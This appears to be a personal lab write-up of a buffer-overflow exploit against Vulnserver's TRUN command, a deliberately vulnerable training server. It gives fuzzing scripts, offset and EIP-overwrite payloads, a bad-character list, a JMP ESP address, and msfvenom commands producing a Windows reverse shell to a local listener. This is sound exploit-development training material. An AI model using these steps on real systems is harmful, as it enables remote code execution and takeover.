# Vulnserver TRUN writeup

Demo with vulnserver

1.  Spiking, detect a vulnerable application

    stats.spk:

    ```
    s_readline();
    s_string("STATS ");
    s_string_variable("FUZZ");
    ```

    trun.spk:

    ```
    s_readline();
    s_string("TRUN ");
    s_string_variable("FUZZ");
    ```

    - `spike-fuzzer-generic-send_tcp 192.168.122.4 9999 ./stats.spk 0 0`
      - no crashes
    - `spike-fuzzer-generic-send_tcp 192.168.122.4 9999 ./trun.spk 0 0`

      - we override the EIP, therefore, the TRUN command is vulnerable to BO

    - look at memory dump, find AAAAAA (instead of manually fuzzing again with python for example)
    - count how many AAA's (address math) => 'A' \* 2983

2.  Fuzzing

    Very simmilar to spiking. Trying to find out rough estimate of when we overwrite the EIP.

3.  Finding the offset

    - `/opt/metasploit/tools/exploit/pattern_create.rb -l 3000`
      - data in EIP: 386F4337
    - `/opt/metasploit/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337`
      > [*] Exact match at offset 2003

4.  Overwriting the EIP

    We can now send the payload:

    - `shellcode = b"A" * 2003 + b"B" * 4`

5.  Finding the bad characters

    Find the characters that are "bad" for the specific binary. For example, characters that execute some other function, so we can't use them in our shell code.

    [badchars](https://github.com/cytopia/badchars)

    ```
    \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
    ```

    send payload:

    - `shellcode = b"A" * 2003 + b"B" * 4 + badchars`

    Follow ESP address in memory hex dump and see what characters are missing.
    In Immunity Debugger, right click on ESP and -> follow in dump

    '\x00' is always a bad character....

6.  Finding the right module

    - [mona modules for Immunity Debugger](https://github.com/corelan/mona)

      - `!mona modules`

    I) We notice that we are overriding ESP with extra chars after EIP

    - find a jmp to the esp somwhere inside the code

      `!mona jmp -r esp`

      some options: `62501203`, `625011AF`, `625011BB`

    - now we can override eip with desired address and execute our shellcode from esp

    II)

    Finding for a dll or something similar inside of a program that has no memory protections, no DEP, no ASLR, no SafeSEH...

    - `/opt/metasploit/tools/exploit/nasm_shell.rb`

      - `JMP ESP`
        > FFE4
      - see asm commands as actual bytes

    - `!mona find -s "\xFF\xE4" -m essfunc.dll`
      > 0x625011AF

7.  Generating the shellcode

- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v shellcode`
